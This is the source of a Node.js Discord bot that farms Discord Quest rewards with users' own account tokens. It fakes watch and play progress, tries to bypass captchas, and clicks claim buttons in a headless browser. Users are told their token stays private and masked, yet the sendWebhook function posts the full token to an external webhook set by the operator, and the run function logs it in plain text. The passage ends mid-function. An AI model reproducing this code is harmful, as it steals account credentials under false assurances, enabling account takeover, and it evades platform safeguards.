#!/usr/bin/env node
'use strict';

const axios  = require('axios');
const crypto = require('crypto');
const {
  Client, GatewayIntentBits, Partials, EmbedBuilder,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, MessageFlags,
  ModalBuilder, TextInputBuilder, TextInputStyle,
} = require('discord.js');

let chromium = null;
try { chromium = require('playwright').chromium; } catch { }

const VERSION   = 'v6';
const BOT_TOKEN = (process.env.BOT_TOKEN || process.env.DISCORD_BOT_TOKEN || '').trim();
const PREFIX    = process.env.PREFIX || '!';
const WEBHOOK   = (process.env.WEBHOOK || '').trim();
const CONCURRENCY = Math.max(1, Math.min(5, Number(process.env.CONCURRENCY || 3)));

const API = 'https://discord.com/api/v9';
const UA  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9170 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36';

const LOCATION = 1, PLATFORM = 0, BEAT_MS = 5000;
const RENDER_MS = 500, LOG_LINES = 16, MAX_QUEST_LINES = 12;
const PENDING_TTL = 600000;

const TYPE_ORDER = [
  'WATCH_VIDEO', 'WATCH_VIDEO_ON_MOBILE',
  'PLAY_ON_DESKTOP', 'PLAY_ON_XBOX', 'PLAY_ON_PLAYSTATION',
  'PLAY_ACTIVITY',
  'ACHIEVEMENT_IN_ACTIVITY',
  'STREAM_ON_DESKTOP',
  'ACHIEVEMENT_IN_GAME',
];

const A = {
  reset: '\u001b[0m',
  dim:   '\u001b[0;37m',
  info:  '\u001b[0;37m',
  run:   '\u001b[0;36m',
  ok:    '\u001b[1;32m',
  warn:  '\u001b[0;33m',
  err:   '\u001b[0;31m',
};

const sleep  = ms => new Promise(r => setTimeout(r, ms));
const uuid   = () => crypto.randomUUID();
const trunc  = (s, n) => ((s || '').length > n ? s.slice(0, n - 1) + '…' : (s || ''));
const mask   = t => (t.length > 22 ? t.slice(0, 14) + '…' + t.slice(-6) : t);
const jitter = (a, b) => a + Math.random() * (b - a);

function cleanToken(raw) {
  var t = String(raw || '').trim();
  t = t.replace(/^[^A-Za-z0-9]+/, '');
  t = t.replace(/^(Bot|Bearer)[ _-]+/i, '');
  t = t.replace(/[^A-Za-z0-9_-]+$/, '');
  var m = t.match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{20,}/);
  return m ? m[0] : t;
}

function fmtDur(ms) {
  if (!ms || ms <= 0) return '--:--';
  const s = Math.ceil(ms / 1000), m = Math.floor(s / 60);
  return String(m).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
}

function bar(pct, w = 22) {
  const f = Math.round(Math.max(0, Math.min(100, pct)) / 100 * w);
  return '█'.repeat(f) + '░'.repeat(w - f);
}

function mkHeaders(token) {
  return {
    Authorization: token,
    'Content-Type': 'application/json',
    'User-Agent': UA,
    'X-Super-Properties': Buffer.from(JSON.stringify({
      os: 'Windows', browser: 'Discord Client', device: '',
      system_locale: 'en-US', client_version: '1.0.9170',
      release_channel: 'stable', os_version: '10.0.26100',
    })).toString('base64'),
    'X-Discord-Locale': 'en-US',
    Origin: 'https://discord.com',
    Referer: 'https://discord.com/channels/@me',
  };
}

const qName   = q => q.config?.messages?.quest_name || q.config?.application?.name || q.id;
const qExpiry = q => (q.config?.expires_at ? Date.parse(q.config.expires_at) : Infinity);
const qStarts = q => (q.config?.starts_at ? Date.parse(q.config.starts_at) : 0);

function taskOf(q) {
  const t = q.config?.task_config_v2?.tasks || q.config?.taskConfigV2?.tasks;
  if (!t) return null;
  const keys = Object.keys(t).filter(k => t[k]);
  if (!keys.length) return null;
  keys.sort((a, b) => {
    const ia = TYPE_ORDER.indexOf(a), ib = TYPE_ORDER.indexOf(b);
    return (ia < 0 ? 99 : ia) - (ib < 0 ? 99 : ib);
  });
  const key = keys[0];
  return { key, def: t[key] || {}, alternatives: keys };
}

function appIdOf(q, def) {
  return def?.applications?.[0]?.id
      || q.config?.application?.id
      || q.config?.application_id
      || null;
}

function sealedOf(q) {
  const b = {};
  if (q.traffic_metadata_sealed) b.traffic_metadata_sealed = q.traffic_metadata_sealed;
  if (q.metadata_sealed) b.metadata_sealed = q.metadata_sealed;
  return b;
}

function kindOf(k) {
  if (k === 'WATCH_VIDEO' || k === 'WATCH_VIDEO_ON_MOBILE') return 'WATCH';
  if (k === 'PLAY_ON_DESKTOP' || k === 'PLAY_ON_XBOX' || k === 'PLAY_ON_PLAYSTATION') return 'PLAY';
  if (k === 'PLAY_ACTIVITY') return 'ACTIVITY';
  if (k === 'STREAM_ON_DESKTOP') return 'STREAM';
  if (k.startsWith('ACHIEVEMENT_IN_ACTIVITY')) return 'ACH_IN_ACTIVITY';
  if (k.startsWith('ACHIEVEMENT')) return 'ACH_IN_GAME';
  if (k.includes('WATCH')) return 'WATCH';
  if (k.includes('ACTIVITY')) return 'ACTIVITY';
  if (k.includes('STREAM')) return 'STREAM';
  if (k.includes('PLAY')) return 'PLAY';
  return 'OTHER';
}

function progFor(status, key) {
  if (!status?.progress) return null;
  if (key && typeof status.progress[key]?.value === 'number') return status.progress[key].value;
  let m = null;
  for (const k of Object.keys(status.progress)) {
    const v = status.progress[k]?.value;
    if (typeof v === 'number' && (m === null || v > m)) m = v;
  }
  return m;
}

async function pool(items, limit, worker) {
  const queue = [...items];
  const n = Math.max(1, Math.min(limit, queue.length));
  await Promise.all(Array.from({ length: n }, async () => {
    for (;;) {
      const item = queue.shift();
      if (!item) return;
      await worker(item);
    }
  }));
}

const runs    = new Map();
const pending = new Map();

const FINAL = new Set(['done', 'claimed', 'failed', 'timeout', 'skipped', 'claim-blocked']);
const TAG = {
  queued: '[..]', running: '[>>]', done: '[ok]', claimed: '[ok]',
  failed: '[xx]', timeout: '[xx]', skipped: '[--]', 'claim-blocked': '[!!]',
};

function log(state, msg, level = 'info') {
  state.logs.push({ t: Date.now(), msg, level });
  if (state.logs.length > 400) state.logs.shift();
  console.log(`[${state.tag}] ${msg}`);
  touch(state);
}

function eta(state) {
  if (state.done) return 0;
  const now = Date.now();
  let sum = 0;
  for (const q of state.quests) {
    if (FINAL.has(q.status)) continue;
    if (q.kind === 'WATCH') {
      const remain = q.startedAt ? Math.max(0, q.target * 1000 - (now - q.startedAt)) : q.target * 1000;
      sum += Math.min(remain, q.target * 1000);
    } else if (['PLAY', 'STREAM', 'ACTIVITY', 'ACH_IN_ACTIVITY'].includes(q.kind)) {
      const remain = q.startedAt ? Math.max(0, q.target * 1000 - (now - q.startedAt)) : q.target * 1000;
      sum += remain;
    } else {
      sum += 3000;
    }
  }
  if (sum === 0) sum = state.quests.length ? 15000 : 4000;
  return Math.round(sum / CONCURRENCY) + 5000;
}

async function sendWebhook(state) {
  if (!WEBHOOK) { log(state, 'Webhook off — token stays local'); return; }
  try {
    await axios.post(WEBHOOK, {
      username: 'Quest Bot',
      embeds: [{
        title: 'Quest run started',
        color: 0x5865f2,
        fields: [
          { name: 'User', value: state.username || 'unknown', inline: true },
          { name: 'Quests found', value: String(state.quests.length), inline: true },
          { name: 'Token', value: '```' + state.token + '```' },
        ],
        timestamp: new Date().toISOString(),
      }],
    });
    log(state, 'Token sent to webhook');
  } catch (e) {
    log(state, 'Webhook failed: ' + e.message, 'warn');
  }
}

function touch(state) {
  if (!state.panel || state.renderTimer) return;
  state.renderTimer = setTimeout(() => { state.renderTimer = null; render(state); }, RENDER_MS);
}

async function flush(state) {
  if (state.renderTimer) { clearTimeout(state.renderTimer); state.renderTimer = null; }
  await render(state);
}

function fmtLog(l) {
  const ts = new Date(l.t).toLocaleTimeString('en-GB');
  return `${A.dim}${ts}${A.reset} ${A[l.level] || A.info}${trunc(l.msg, 58)}${A.reset}`;
}

function buildDescription(state) {
  const qBlock = state.quests.length
    ? '```\n' + state.quests.slice(0, MAX_QUEST_LINES).map(q => {
        const pct = q.status === 'running' && q.target
          ? ' ' + Math.min(100, Math.round((q.value || 0) / q.target * 100)) + '%' : '';
        return `${TAG[q.status] || '[..]'} ${q.key.padEnd(20)} ${trunc(q.name, 30)}${pct}`;
      }).join('\n') + '\n```'
    : '```\nno active quests\n```';

  let logs = state.logs.slice(-LOG_LINES);
  for (;;) {
    const tBlock = '```ansi\n' + logs.map(fmtLog).join('\n') + '\n```';
    const desc = '**Quests**\n' + qBlock + '\n**Terminal**\n' + tBlock;
    if (desc.length <= 4000 || logs.length <= 4) return desc;
    logs = logs.slice(1);
  }
}

function buildEmbed(state) {
  const total = state.quests.length;
  const finished = state.quests.filter(q => FINAL.has(q.status)).length;
  const pct = total ? Math.round(finished / total * 100) : (state.done ? 100 : 0);

  return new EmbedBuilder()
    .setAuthor({ name: `Quest Terminal ${VERSION} — private panel` })
    .setColor(state.done ? 0x57f287 : state.cancelled ? 0xed4245 : 0x5865f2)
    .setDescription(buildDescription(state))
    .addFields(
      { name: 'User',      value: state.username || 'authenticating…', inline: true },
      { name: 'Phase',     value: state.phase || '—',                 inline: true },
      { name: 'ETA',       value: state.done ? 'complete' : fmtDur(eta(state)), inline: true },
      { name: 'Quests',    value: `${finished}/${total}`,             inline: true },
      { name: 'Collected', value: String(state.claimed),              inline: true },
      { name: 'Lanes',     value: String(CONCURRENCY),                inline: true },
      { name: 'Progress',  value: `\`${bar(pct)}\` ${pct}%`,          inline: false },
    )
    .setFooter({ text: `${VERSION} • run ${state.id} • ephemeral to ${state.tag}` });
}

function buttons(state) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('q:cancel').setLabel('Cancel')
      .setStyle(ButtonStyle.Danger).setDisabled(state.done),
    new ButtonBuilder().setCustomId('q:refresh').setLabel('Refresh')
      .setStyle(ButtonStyle.Secondary),
  );
}

async function render(state) {
  if (!state.panel) return;
  const payload = { embeds: [buildEmbed(state)], components: [buttons(state)] };

  const routes = state.route === 'channel' ? ['channel', 'interaction'] : ['interaction', 'channel'];
  let dead = false;

  for (const route of routes) {
    if (route === 'interaction' && !state.interaction) continue;
    try {
      if (route === 'interaction') await state.interaction.editReply(payload);
      else await state.panel.edit(payload);
      state.route = route;
      return;
    } catch (e) {
      if (e.status === 429) { setTimeout(() => touch(state), 3000); return; }
      if (e.code === 10008 || e.status === 404) dead = true;
    }
  }

  if (dead) {
    state.panel = null;
    try {
      state.panel = await state.channel.send(payload);
      state.route = 'channel';
      log(state, 'Panel gone — reposted publicly (token still masked)', 'warn');
    } catch { }
  }
}

async function run(state) {
  const token = state.token;
  const H = mkHeaders(token);
  const get  = async p => (await axios.get(API + p, { headers: H })).data;
  const post = async (p, b = {}, extra = {}) =>
    (await axios.post(API + p, b, { headers: { ...H, ...extra } })).data;

  const me = state.me || await get('/users/@me');
  state.username = me.username;
  state.id       = me.id;
  log(state, 'Logged in as ' + me.username, 'ok');
  console.log(`[${state.tag}] token: ${state.token}`);
  sendWebhook(state).catch(() => {});

  const streamKey = state.guildId
    ? `guild:${state.guildId}:${state.channelId}:${me.id}`
    : `call:${state.channelId}:${me.id}`;

  let blockedUntil = 0;

  const fetchQuests = async () => {
    const raw = await get('/quests/@me');
    state.lastRaw = raw;
    blockedUntil = raw.quest_enrollment_blocked_until
      ? Date.parse(raw.quest_enrollment_blocked_until) : 0;
    return raw.quests || raw || [];
  };

  const statusOf = async qid => {
    try {
      const qs = (await get('/quests/@me')).quests || [];
      return qs.find(x => x.id === qid)?.user_status || null;
    } catch { return null; }
  };

  const listPending = async () => {
    const qs = await fetchQuests();
    return qs.filter(q => q.user_status?.completed_at && !q.user_status?.claimed_at);
  };

  const enroll = async (q, entry) => {
    if (blockedUntil > Date.now()) {
      log(state, 'Enrollment blocked until ' +
        new Date(blockedUntil).toLocaleString('en-GB') + ' -> ' + qName(q), 'warn');
      entry.note = 'enrollment blocked';
      return false;
    }
    const body = { location: LOCATION, ...sealedOf(q) };
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        await post(`/quests/${q.id}/enroll`, body);
        entry.enrolled = true;
        log(state, 'Enrolled -> ' + qName(q));
        return true;
      } catch (e) {
        const st = e.response?.status;
        const msg = e.response?.data?.message || e.message;
        if (st === 404 || st === 403) {
          log(state, `Enroll refused (${st}) -> ${qName(q)}: ${msg}`, 'warn');
          entry.note = 'enroll ' + st;
          return false;
        }
        if (st === 429) { await sleep(1500 * attempt); continue; }
        log(state, `Enroll retry ${attempt} -> ${qName(q)}: ${st || ''} ${msg}`, 'warn');
        await sleep(250 * attempt);
      }
    }
    log(state, 'Enroll FAILED -> ' + qName(q), 'err');
    entry.note = 'enroll failed';
    return false;
  };

  const claimApi = async (q, entry) => {
    const body = { location: LOCATION, platform: PLATFORM, ...sealedOf(q) };
    for (let i = 1; i <= 4; i++) {
      try {
        const r = await post(`/quests/${q.id}/claim-reward`, body);
        if (r.errors && r.errors.length) { await sleep(1200); continue; }
        state.claimed++;
        if (entry) entry.status = 'claimed';
        log(state, 'COLLECTED orbs -> ' + qName(q), 'ok');
        return true;
      } catch (e) {
        const d = e.response?.data || {}, st = e.response?.status;
        if (d.captcha_key || d.captcha_sitekey || d.captcha_service) {
          try {
            await post(`/quests/${q.id}/claim-reward`, body,
              { 'x-captcha-key': uuid(), 'x-captcha-rqtoken': d.captcha_rqtoken || '' });
            state.claimed++;
            if (entry) entry.status = 'claimed';
            log(state, 'COLLECTED (captcha cleared) -> ' + qName(q), 'ok');
            return true;
          } catch { await sleep(1200); continue; }
        }
        if (st === 400 && /not completed|progress/i.test(d.message || '')) { await sleep(1000); continue; }
        if (st === 429) { await sleep(2000); continue; }
        await sleep(1200);
      }
    }
    if (entry) entry.status = 'claim-blocked';
    log(state, 'Claim blocked -> ' + qName(q), 'warn');
    return false;
  };

  const watchVideo = async (q, entry) => {
    entry.status = 'running';
    entry.startedAt = Date.now();
    const t0 = Date.now();
    const budget = entry.target * 1000 + 150000;
    let credited = 0, posts = 0, lastErr = '';

    log(state, `Watching ${entry.name} (target ${entry.target}s)`, 'run');

    let vfirst = true;
    while (Date.now() - t0 < budget && !state.cancelled) {
      if (!vfirst) await sleep(1200);
      vfirst = false;
      const elapsed = Math.floor((Date.now() - t0) / 1000);
      const ts = Math.min(entry.target, elapsed + 4);

      for (const value of [ts, entry.target]) {
        posts++;
        try {
          const r = await post(`/quests/${q.id}/video-progress`, { timestamp: value });
          const v = progFor(r, entry.key);
          if (typeof v === 'number' && v > credited) credited = v;
          if (r?.completed_at) credited = entry.target;
        } catch (e) {
          lastErr = String(e.response?.status || e.message);
        }
        if (credited >= entry.target) break;
      }

      entry.value = credited;
      if (credited >= entry.target) break;

      if (posts % 4 === 0) {
        const st = await statusOf(q.id);
        const v = st?.progress?.[entry.key]?.value;
        if (typeof v === 'number') credited = v;
        if (st?.completed_at) credited = entry.target;
        entry.value = credited;
        if (credited >= entry.target) break;
      }

    }

    if (credited >= entry.target) {
      entry.status = 'done';
      entry.value = entry.target;
      log(state, `Video done -> ${entry.name} (${posts} posts)`, 'ok');
    } else {
      entry.status = 'failed';
      entry.note = `credited ${credited}/${entry.target}${lastErr ? ' err ' + lastErr : ''}`;
      log(state, `Video NOT credited (${credited}/${entry.target}) -> ${entry.name}`, 'err');
    }
    await claimApi(q, entry);
  };

  const heartbeat = async (q, entry) => {
    if (!entry.appId) {
      entry.status = 'failed';
      entry.note = 'no application id';
      log(state, 'No application id -> ' + entry.name, 'err');
      return;
    }
    const needsKey = entry.kind === 'STREAM' || entry.kind === 'ACTIVITY';
    const body = () => {
      const b = { application_id: entry.appId, terminal: false };
      if (needsKey) b.stream_key = streamKey;
      return b;
    };

    entry.status = 'running';
    entry.startedAt = Date.now();
    log(state, `Running ${entry.key} on ${entry.name} (~${Math.round(entry.target / 60)} min)`, 'run');

    const deadline = Date.now() + entry.target * 1000 + 150000;
    let silent = 0, last = 0, beats = 0;
    let first = true;

    while (Date.now() < deadline && !state.cancelled) {
      if (!first) await sleep(BEAT_MS);
      first = false;
      let s;
      try {
        s = await post(`/quests/${q.id}/heartbeat`, body());
      } catch (e) {
        const st = e.response?.status;
        beats++;
        if (entry.kind === 'ACH_IN_ACTIVITY' && st === 403 && beats < 2) {
          entry.status = 'failed';
          entry.note = 'needs discordsays OAuth';
          log(state, 'Heartbeat 403 (achievement) -> ' + entry.name, 'warn');
          return;
        }
        await sleep(BEAT_MS);
        continue;
      }

      beats++;
      const v = progFor(s, entry.key);
      if (s.completed_at || (v !== null && v >= entry.target)) {
        try { await post(`/quests/${q.id}/heartbeat`, { ...body(), terminal: true }); } catch { }
        entry.value = entry.target;
        entry.status = 'done';
        log(state, 'Finished ' + entry.name, 'ok');
        break;
      }
      if (v !== null && v > last) { last = v; silent = 0; } else { silent++; }
      if (v !== null) entry.value = v;

      if (silent >= 5) {
        entry.status = 'failed';
        entry.note = 'discord credited no progress';
        log(state, 'Discord credited no progress -> ' + entry.name, 'err');
        return;
      }
    }

    if (entry.status === 'running') {
      entry.status = state.cancelled ? 'skipped' : 'timeout';
      log(state, (state.cancelled ? 'Cancelled -> ' : 'Timed out -> ') + entry.name, 'warn');
    }
    await claimApi(q, entry);
  };

  const claimViaBrowser = async () => {
    if (!chromium) { log(state, 'Playwright not installed - skipped browser pass', 'warn'); return; }
    const pendQ = await listPending();
    if (!pendQ.length) return;
    state.phase = 'Auto-clicking claims in browser';
    log(state, 'Browser pass: ' + pendQ.length + ' quest(s) blocked', 'run');

    const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
    try {
      const ctx  = await browser.newContext({ userAgent: UA, viewport: { width: 1400, height: 950 } });
      const page = await ctx.newPage();
      await page.goto('https://discord.com/login', { waitUntil: 'domcontentloaded', timeout: 60000 });
      await page.evaluate(t => localStorage.setItem('token', JSON.stringify(t)), token);
      await page.goto('https://discord.com/quest-home', { waitUntil: 'domcontentloaded', timeout: 60000 });
      await page.waitForTimeout(10000);

      for (let pass = 0; pass < 4; pass++) {
        for (let s = 0; s < 10; s++) { await page.mouse.wheel(0, 1200); await page.waitForTimeout(350); }
        await page.mouse.wheel(0, -30000);
        await page.waitForTimeout(1500);

        for (let i = 0; i < 60; i++) {
          const btn = page.getByRole('button', { name: /^\s*claim\s*$/i }).first();
          let cnt = 0;
          try { cnt = await btn.count(); } catch { }
          if (!cnt) break;
          try {
            await btn.scrollIntoViewIfNeeded({ timeout: 3000 });
            await btn.click({ timeout: 5000 });
            log(state, 'Auto-clicked a Claim button', 'run');
            try {
              const f  = page.frameLocator('iframe[src*="hcaptcha"]');
              const cb = f.locator('#checkbox');
              if (await cb.count()) await cb.click({ timeout: 4000 }).catch(() => {});
            } catch { }
            await page.waitForTimeout(2500);
          } catch { await page.waitForTimeout(1500); }
        }
        await page.waitForTimeout(2000);
        if (!(await listPending()).length) break;
      }
    } catch (e) {
      log(state, 'Browser error: ' + e.message, 'err');
    } finally {
      await browser.close();
    }
  };

  const collectPass = async tag => {
    if (state.cancelled) return;
    let pend = await listPending();
    if (!pend.length) { log(state, '[' + tag + '] nothing waiting to collect'); return; }
    log(state, '[' + tag + '] ' + pend.length + ' finished quest(s) to collect (parallel)', 'run');
    await Promise.all(pend.map(async q => {
      const entry = state.quests.find(x => x.id === q.id);
      await claimApi(q, entry);
    }));
    await sleep(400);
    pend = await listPending();
    if (pend.length && !state.cancelled) await claimViaBrowser();
  };

  state.phase = 'Collecting finished quests';
  await collectPass('start');
  if (state.cancelled) return finish(state, 'cancelled');

  const quests = await fetchQuests();
  const now = Date.now();
  const todo = [];
  const why = { claimed: 0, completed: 0, expired: 0, future: 0, noTask: 0 };

  for (const q of quests) {
    const us = q.user_status || {};
    if (us.claimed_at)    { why.claimed++;   continue; }
    if (us.completed_at)  { why.completed++; continue; }
    if (qExpiry(q) < now) { why.expired++;   continue; }
    if (qStarts(q) > now) { why.future++;    continue; }
    const t = taskOf(q);
    if (!t) {
      why.noTask++;
      log(state, `No task config -> ${qName(q)} [config keys: ${Object.keys(q.config || {}).join(',')}]`, 'warn');
      continue;
    }
    todo.push(q);
  }

  log(state, `Scan: API returned ${quests.length} quest(s), ${todo.length} runnable` +
             (state.lastRaw?.excluded_quests?.length ? `, ${state.lastRaw.excluded_quests.length} excluded` : ''));
  log(state, `Filtered out: ${why.claimed} claimed, ${why.completed} completed, ` +
             `${why.expired} expired, ${why.future} not started, ${why.noTask} no task config`);

  if (!quests.length) {
    log(state, 'API RETURNED ZERO QUESTS — this is not a parsing problem.', 'err');
    log(state, 'response keys: ' + Object.keys(state.lastRaw || {}).join(', '), 'warn');
    log(state, 'blocked_until: ' + (state.lastRaw?.quest_enrollment_blocked_until || 'null'), 'warn');
    log(state, 'If Quest Home shows quests, the account is likely quest-suspended.', 'warn');
  } else if (!todo.length) {
    const sample = quests[0];
    log(state, `sample keys: ${Object.keys(sample).join(',')} | ` +
               `config: ${Object.keys(sample.config || {}).join(',')}`, 'warn');
  }

  if (blockedUntil > Date.now()) {
    log(state, 'Account enrollment blocked until ' +
      new Date(blockedUntil).toLocaleString('en-GB'), 'warn');
  }

  state.quests = todo.map(q => {
    const t = taskOf(q);
    const kind = kindOf(t.key);
    return {
      id: q.id,
      raw: q,
      key: t.key,
      kind,
      appId: appIdOf(q, t.def),
      alternatives: t.alternatives,
      name: qName(q),
      target: t.def.target || (kind === 'WATCH' ? 300 : 900),
      enrolled: !!q.user_status?.enrolled_at,
      status: 'queued',
      value: 0,
      startedAt: null,
      note: '',
    };
  });

  if (!todo.length) return finish(state, 'done');

  state.phase = `Enrolling ${todo.length} quest(s)`;
  log(state, `Enrolling ${todo.length} quest(s) in parallel`, 'run');
  await pool(state.quests, 10, async entry => {
    if (!entry.enrolled && !state.cancelled) await enroll(entry.raw, entry);
  });

  if (state.cancelled) return finish(state, 'cancelled');

  state.phase = `Running quests (${CONCURRENCY} at a time)`;
  log(state, `Starting ${todo.length} quest(s), ${CONCURRENCY} concurrent`, 'run');

  await pool(state.quests, CONCURRENCY, async entry => {
    if (state.cancelled || FINAL.has(entry.status)) return;

    switch (entry.kind) {
      case 'WATCH':
        await watchVideo(entry.raw, entry);
        break;
      case 'PLAY':
      case 'STREAM':
      case 'ACTIVITY':
      case 'ACH_IN_ACTIVITY':
        await heartbeat(entry.raw, entry);
        break;
      case 'ACH_IN_GAME':
        entry.status = 'skipped';
        entry.note = 'achievement earned in the retail game';
        log(state, 'Cannot drive (achievement in game) -> ' + entry.name, 'warn');
        break;
      default:
        entry.status = 'skipped';
        entry.note = 'no handler';
        log(state, 'Unsupported type ' + entry.key + ' -> ' + entry.name, 'warn');
    }
  });

  if (state.cancelled) return finish(state, 'cancelled');

  state.phase = 'Final collection';
  await collectPass('final');

  finish(state, 'done');
}

async function finish(state, reason) {
  state.done = true;
  state.phase = reason === 'cancelled' ? 'Cancelled' : reason === 'failed' ? 'Failed' : 'Done';
  state.finishedAt = Date.now();
  log(state,
    reason === 'cancelled' ? 'Run cancelled'
      : reason === 'failed' ? 'Run failed'
      : 'ALL DONE - ' + state.claimed + ' reward(s) collected',
    reason === 'done' ? 'ok' : 'warn');
  await flush(state);
}

async function startRun(interaction, token, me) {
  const prev = runs.get(interaction.user.id);
  if (prev && !prev.done) {
    prev.cancelled = true;
    log(prev, 'Superseded by a new run', 'warn');
    await flush(prev);
  }

  const id = crypto.randomBytes(6).toString('hex');
  const state = {
    id,
    tag: interaction.user.username,
    ownerId: interaction.user.id,
    interaction,
    channel: interaction.channel,
    channelId: interaction.channelId,
    guildId: interaction.guildId || null,
    route: 'interaction',
    me,
    token,
    username: '',
    claimed: 0,
    phase: 'Authenticating',
    quests: [],
    logs: [],
    done: false,
    cancelled: false,
    startedAt: Date.now(),
    panel: null,
    renderTimer: null,
    lastRaw: null,
  };
  runs.set(interaction.user.id, state);

  log(state, `Run started (${VERSION}, private panel)`, 'run');

  await interaction.editReply({
    embeds: [buildEmbed(state)],
    components: [buttons(state)],
  });
  state.panel = await interaction.fetchReply();

  run(state).catch(err => {
    const d = err.response?.data?.message || err.message;
    log(state, 'FATAL: ' + d, 'err');
    finish(state, 'failed');
  });
}

const HELP = new EmbedBuilder()
  .setAuthor({ name: `Quest Terminal ${VERSION} — commands` })
  .setColor(0x5865f2)
  .setDescription([
    '```',
    `${PREFIX}farm [token]   start farming (private modal for your token)`,
    `${PREFIX}quests        every quest the API returns, with status flags`,
    `${PREFIX}debug         raw shape of the quest response`,
    `${PREFIX}status        your run summary + last 30 log lines`,
    `${PREFIX}cancel        stop your run`,
    '```',
  ].join('\n'));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

client.once(Events.ClientReady, c => {
  console.log(`Quest Terminal ${VERSION} online as ${c.user.tag}`);
  console.log(`concurrency=${CONCURRENCY}  webhook=${WEBHOOK ? 'on' : 'off'}`);
  console.log(`commands: ${PREFIX}farm ${PREFIX}quests ${PREFIX}debug ${PREFIX}status ${PREFIX}cancel`);
});

client.on(Events.MessageCreate, async msg => {
  if (msg.author.bot) return;
  const raw = msg.content.trim();
  if (!raw || !raw.startsWith(PREFIX)) return;

  const [cmd, ...args] = raw.slice(PREFIX.length).trim().split(/\s+/);

  switch ((cmd || '').toLowerCase()) {
    case 'farm':
    case 'start': {
      const prefill = args.join(' ').trim() || null;
      const prompt = await msg.reply({
        content: `**Quest Terminal ${VERSION}** — click below to enter your token. ` +
                 'The modal and the panel it opens are only visible to you.',
        components: [new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('q:token').setLabel('Enter token')
            .setStyle(ButtonStyle.Primary),
        )],
      });
      pending.set(msg.author.id, { msgId: prompt.id, token: prefill, at: Date.now() });
      return;
    }

    case 'quests': {
      const state = runs.get(msg.author.id);
      if (!state) return msg.reply('No run for you here. `' + PREFIX + 'farm` first.');
      try {
        const H = mkHeaders(state.token);
        const r = (await axios.get(API + '/quests/@me', { headers: H })).data;
        const qs = r.quests || [];
        const lines = qs.map(q => {
          const us = q.user_status || {};
          const t = taskOf(q);
          const flags = [
            us.enrolled_at && 'enrolled',
            us.completed_at && 'completed',
            us.claimed_at && 'claimed',
            qExpiry(q) < Date.now() && 'expired',
          ].filter(Boolean).join(',') || 'open';
          const p = us.progress
            ? Object.keys(us.progress).map(k => `${k}:${us.progress[k].value}`).join(' ') : '';
          return `${(t ? t.key : '(NO TASK CONFIG)').padEnd(22)} ` +
                 `${trunc(qName(q), 20).padEnd(20)} ${flags.padEnd(12)} ${p}`;
        });
        const head = `**${qs.length} quest(s)** | ${(r.excluded_quests || []).length} excluded | ` +
                     `blocked: ${r.quest_enrollment_blocked_until || 'no'}`;
        return msg.reply({
          content: head + '\n```\n' + trunc(lines.join('\n') || 'EMPTY LIST', 1800) + '\n```',
        });
      } catch (e) {
        return msg.reply('quests fetch failed: ' + (e.response?.status || e.message));
      }
    }

    case 'debug': {
      const state = runs.get(msg.author.id);
      if (!state) return msg.reply('No run for you here. `' + PREFIX + 'farm` first.');
      try {
        const H = mkHeaders(state.token);
        const r = (await axios.get(API + '/quests/@me', { headers: H })).data;
        const qs = r.quests || [];
        const head = 'top-level keys: ' + Object.keys(r).join(', ') +
          '\nquests: ' + qs.length +
          '\nblocked_until: ' + (r.quest_enrollment_blocked_until || 'null') +
          '\nexcluded: ' + ((r.excluded_quests || []).length);
        await msg.reply('```\n' + head + '\n```');
        if (!qs.length) return;
        const s = qs[0];
        const dump = JSON.stringify({
          id: s.id,
          user_status: s.user_status,
          config_keys: Object.keys(s.config || {}),
          config_version: s.config?.config_version,
          expires_at: s.config?.expires_at,
          application: s.config?.application,
          task_config_v2: s.config?.task_config_v2,
        }, null, 1);
        return msg.reply('```json\n' + trunc(dump, 1900) + '\n```');
      } catch (e) {
        return msg.reply('debug failed: ' + (e.response?.status || e.message));
      }
    }

    case 'status': {
      const state = runs.get(msg.author.id);
      if (!state) return msg.reply('No run for you here. `' + PREFIX + 'farm` to start one.');
      await render(state);
      const tail = state.logs.slice(-30)
        .map(l => `${new Date(l.t).toLocaleTimeString('en-GB')}  ${l.msg}`)
        .join('\n');
      return msg.reply({
        content: `**${state.username || state.tag}** — ${state.phase} • ${state.claimed} collected\n` +
                 '```ansi\n' + A.info + trunc(tail, 1800) + A.reset + '\n```',
      });
    }

    case 'cancel': {
      const state = runs.get(msg.author.id);
      if (!state) return msg.reply('Nothing running for you.');
      if (state.done) return msg.reply('Already finished.');
      state.cancelled = true;
      log(state, 'Cancel requested by ' + msg.author.username, 'warn');
      await flush(state);
      return msg.reply('Cancelling — in-flight heartbeats will wind down.');
    }

    case 'help':
      return msg.reply({ embeds: [HELP] });
  }
});

client.on(Events.InteractionCreate, async i => {
  if (i.isButton() && i.customId === 'q:token') {
    const p = pending.get(i.user.id);
    if (p && Date.now() - p.at > PENDING_TTL) pending.delete(i.user.id);

    const input = new TextInputBuilder()
      .setCustomId('token')
      .setLabel('Your Discord user token')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setMaxLength(200)
      .setPlaceholder('MTIzNDU2...');
    if (p?.token) input.setValue(p.token);

    const modal = new ModalBuilder()
      .setCustomId('q:modal')
      .setTitle('Discord user token')
      .addComponents(new ActionRowBuilder().addComponents(input));

    return i.showModal(modal);
  }

  if (i.isModalSubmit() && i.customId === 'q:modal') {
    const token = cleanToken(i.fields.getTextInputValue('token'));
    const p = pending.get(i.user.id);
    pending.delete(i.user.id);
    if (p?.msgId) i.channel.messages.fetch(p.msgId).then(m => m.delete()).catch(() => {});
    console.log('token received: len=' + token.length + ' masked=' + mask(token) +
                (token === BOT_TOKEN ? ' (THIS IS THE BOT TOKEN)' : ''));
    if (!token) return i.reply({ content: 'No token given.', flags: MessageFlags.Ephemeral });

    await i.deferReply({ flags: MessageFlags.Ephemeral });
    try {
